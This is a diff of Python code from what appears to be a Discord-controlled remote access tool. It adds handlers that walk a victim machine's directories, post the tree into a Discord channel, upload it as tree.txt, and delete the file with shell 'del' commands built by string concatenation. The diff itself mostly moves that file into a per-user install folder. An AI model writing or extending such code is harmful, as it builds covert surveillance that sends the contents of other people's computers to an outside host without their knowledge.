@@ -13,11 +13,11 @@ elif str(reaction) == '🔴' and reaction.message.content[:15] == '```End of tre
         try: await i.delete()
         except: pass
     tree_messages = []
-    subprocess.run('del tree.txt', shell=True)
+    subprocess.run('del ' + f'C:\\Users\\{getuser()}\\{software_directory_name}\\tree.txt', shell=True)
 
 elif str(reaction) == '📥' and reaction.message.content[:15] == '```End of tree.':
-    await reaction.message.channel.send(file=discord.File('tree.txt'))
-    subprocess.run('del tree.txt', shell=True)
+    await reaction.message.channel.send(file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\tree.txt'))
+    subprocess.run('del ' + f'C:\\Users\\{getuser()}\\{software_directory_name}\\tree.txt', shell=True)
 
 # on message
 elif message.content == '.clear':
@@ -32,10 +32,10 @@ elif message.content == '.tree':
     await message.delete()
     if message.channel.id == channel_ids['file']:
         tree_messages = []
-
+        tree_txt_path = f'C:\\Users\\{getuser()}\\{software_directory_name}\\' + 'tree.txt'
         dir_path = Path('/'.join(working_directory))
         tree_messages.append(await message.channel.send('```Directory tree requested by ' + str(message.author) + '\n\n' + '/'.join(working_directory) + '```'))
-        with open('tree.txt', 'w', encoding='utf-8') as system_tree:
+        with open(tree_txt_path, 'w', encoding='utf-8') as system_tree:
             system_tree.write(str(dir_path) + '\n')
 
         length_limit = sys.maxsize
@@ -43,7 +43,7 @@ elif message.content == '.tree':
 
         tree_message_content = '```^\n'
         for line in islice(iterator, length_limit):
-            with open('tree.txt', 'a+', encoding='utf-8') as system_tree:
+            with open(tree_txt_path, 'a+', encoding='utf-8') as system_tree:
                 system_tree.write(line + '\n')
             if len(tree_message_content) > 1800:
                 tree_messages.append(await message.channel.send(tree_message_content + str(line) + '```'))
@@ -54,7 +54,6 @@ elif message.content == '.tree':
             tree_messages.append(await message.channel.send(tree_message_content + '```'))
         
         reaction_msg = await message.channel.send('```End of tree. React with 📥 to download this tree as .txt file, or with 🔴 to clear all above messages```')
-        subprocess.run('del tree.txt', shell=True)
         await reaction_msg.add_reaction('📥')
         await reaction_msg.add_reaction('🔴')
     else:
